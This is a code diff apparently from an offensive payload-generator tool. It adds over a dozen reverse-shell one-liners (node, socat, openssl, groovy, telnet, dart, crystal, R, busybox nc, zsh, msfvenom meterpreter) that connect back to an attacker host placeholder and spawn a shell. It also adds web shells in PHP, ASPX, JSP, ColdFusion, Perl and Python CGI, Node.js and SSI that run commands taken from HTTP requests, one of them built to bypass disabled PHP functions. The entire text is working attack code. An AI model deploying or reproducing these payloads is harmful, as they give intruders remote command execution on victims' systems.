@@ -337,6 +337,111 @@ PAYLOADS = {
         "msfvenom",
         "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war",
     ),
+    "node": (
+        "node",
+        (
+            "node -e \"require('child_process').exec("
+            "'bash -c \\\"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\\\"'"
+            ")\""
+        ),
+    ),
+    "node-net": (
+        "node",
+        (
+            "node -e \""
+            "var n=require('net'),s=new n.Socket();"
+            "s.connect({LPORT},'{LHOST}',function(){{"
+            "var sp=require('child_process').spawn('/bin/sh',[]);"
+            "sp.stdin.pipe(s);s.pipe(sp.stdout);s.pipe(sp.stderr)}})\""
+        ),
+    ),
+    "socat": (
+        "socat",
+        "socat tcp:{LHOST}:{LPORT} exec:bash,pty,stderr,setsid,sigint,sane",
+    ),
+    "socat-listener": (
+        "socat",
+        "socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}",
+    ),
+    "openssl": (
+        "openssl",
+        (
+            "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s"
+        ),
+    ),
+    "openssl-listener": (
+        "openssl",
+        (
+            "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=ghost'\n"
+            "  openssl s_server -quiet -key key.pem -cert cert.pem -port {LPORT}"
+        ),
+    ),
+    "groovy": (
+        "groovy",
+        (
+            "String host=\"{LHOST}\";"
+            "int port={LPORT};"
+            "String cmd=\"/bin/bash\";"
+            "Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();"
+            "Socket so=new Socket(host,port);"
+            "InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=so.getInputStream();"
+            "OutputStream po=p.getOutputStream(),so2=so.getOutputStream();"
+            "while(!so.isClosed()){{"
+            "while(pi.available()>0)so2.write(pi.read());"
+            "while(pe.available()>0)so2.write(pe.read());"
+            "while(si.available()>0)po.write(si.read());"
+            "so2.flush();po.flush();Thread.sleep(50);"
+            "try{{p.exitValue();break}}catch(e){{}}}}"
+            "p.destroy();so.close();"
+        ),
+    ),
+    "telnet": (
+        "telnet",
+        "TF=$(mktemp -u);mkfifo $TF && telnet {LHOST} {LPORT} 0<$TF | /bin/bash 1>$TF",
+    ),
+    "dart": (
+        "dart",
+        (
+            "import 'dart:io';"
+            "import 'dart:convert';"
+            "main(){{Socket.connect('{LHOST}',{LPORT}).then((socket){{"
+            "socket.listen((data){{"
+            "Process.start('/bin/sh',[]).then((Process process){{"
+            "process.stdin.writeln(new String.fromCharCodes(data).trim());"
+            "process.stdout.transform(utf8.decoder).listen((e){{socket.write(e);}})}});}});}});  }}"
+        ),
+    ),
+    "crystal": (
+        "crystal",
+        (
+            "require \"process\";require \"socket\";"
+            "s=TCPSocket.new(\"{LHOST}\",{LPORT});"
+            "Process.run(\"/bin/sh\",input:s,output:s,error:s)"
+        ),
+    ),
+    "r-lang": (
+        "r",
+        (
+            "r = 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1';"
+            "system(r)"
+        ),
+    ),
+    "busybox-nc": (
+        "busybox",
+        "busybox nc {LHOST} {LPORT} -e /bin/sh",
+    ),
+    "zsh": (
+        "zsh",
+        "zsh -c 'zmodload zsh/net/tcp && ztcp {LHOST} {LPORT} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
+    ),
+    "msfvenom-android": (
+        "msfvenom",
+        "msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o shell.apk",
+    ),
+    "msfvenom-python": (
+        "msfvenom",
+        "msfvenom -p python/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.py",
+    ),
 }
 
 # Dicas de TTY upgrade
@@ -376,11 +481,29 @@ WEBSHELLS = {
         "move_uploaded_file($_FILES['f']['tmp_name'],'./'.$n);"
         "echo 'Uploaded: '.$n;} ?>"
     ),
+    "php-bypass-df": (
+        "<?php "
+        "$f=array_values(array_filter(array_map(function($x){return is_callable($x)?$x:null;},"
+        "['shell_exec','exec','system','passthru','popen','proc_open'])));"
+        "if($f){echo call_user_func($f[0],$_GET['c']);}?>"
+    ),
+    "php-preg": (
+        "<?php preg_replace('/.*/e',$_POST['cmd'],''); ?>"
+    ),
     "aspx": (
         "<%@ Page Language=\"C#\" %>"
         "<%@ Import Namespace=\"System.Diagnostics\" %>"
         "<% Response.Write(new StreamReader(Process.Start(new ProcessStartInfo(\"cmd.exe\","
         "\"/c \"+Request[\"c\"]){RedirectStandardOutput=true}).StandardOutput).ReadToEnd()); %>"
+    ),
+    "aspx-auth": (
+        "<%@ Page Language=\"C#\" %>\n"
+        "<%@ Import Namespace=\"System.Diagnostics\" %>\n"
+        "<%@ Import Namespace=\"System.IO\" %>\n"
+        "<% if(Request[\"k\"]==\"ghost\"){"
+        "var p=new ProcessStartInfo(\"cmd\",\"/c \"+Request[\"c\"]){"
+        "RedirectStandardOutput=true,UseShellExecute=false};"
+        "Response.Write(new StreamReader(Process.Start(p).StandardOutput).ReadToEnd());}%>"
     ),
     "jsp": (
         "<%@ page import=\"java.io.*\" %>"
@@ -388,6 +511,47 @@ WEBSHELLS = {
         "Process p=Runtime.getRuntime().exec(c);"
         "BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));"
         "String l; while((l=r.readLine())!=null) out.println(l); %>"
+    ),
+    "jsp-runtime": (
+        "<%@ page import=\"java.io.*,java.util.*\" %>"
+        "<% String[] cmd={\"/bin/bash\",\"-c\",request.getParameter(\"c\")};"
+        "Process p=Runtime.getRuntime().exec(cmd);"
+        "BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));"
+        "String line;StringBuffer sb=new StringBuffer();"
+        "while((line=r.readLine())!=null)sb.append(line).append(\"\\n\");"
+        "out.print(\"<pre>\"+sb.toString()+\"</pre>\"); %>"
+    ),
+    "cfm": (
+        "<cfset cmd=GetHttpRequestData().content>\n"
+        "<cfexecute name=\"/bin/bash\" arguments=\"-c #cmd#\" variable=\"out\" timeout=\"10\"></cfexecute>\n"
+        "<cfoutput>#out#</cfoutput>"
+    ),
+    "perl-cgi": (
+        "#!/usr/bin/perl\n"
+        "use CGI;\n"
+        "my $q=CGI->new;\n"
+        "print $q->header('text/plain');\n"
+        "print `$ENV{QUERY_STRING}`;\n"
+    ),
+    "python-cgi": (
+        "#!/usr/bin/env python3\n"
+        "import cgi,os,sys\n"
+        "print('Content-Type: text/plain\\n')\n"
+        "form=cgi.FieldStorage()\n"
+        "cmd=form.getvalue('c','')\n"
+        "if cmd: print(os.popen(cmd).read())\n"
+    ),
+    "nodejs": (
+        "const http=require('http');\n"
+        "const url=require('url');\n"
+        "const {exec}=require('child_process');\n"
+        "http.createServer((req,res)=>{\n"
+        "  const q=url.parse(req.url,true).query;\n"
+        "  if(q.c){exec(q.c,(e,o)=>{res.end(o||'');});}else res.end('ok');\n"
+        "}).listen(process.env.PORT||8080);\n"
+    ),
+    "shtml": (
+        "<!--#exec cmd=\"id\" -->"
     ),
 }
 
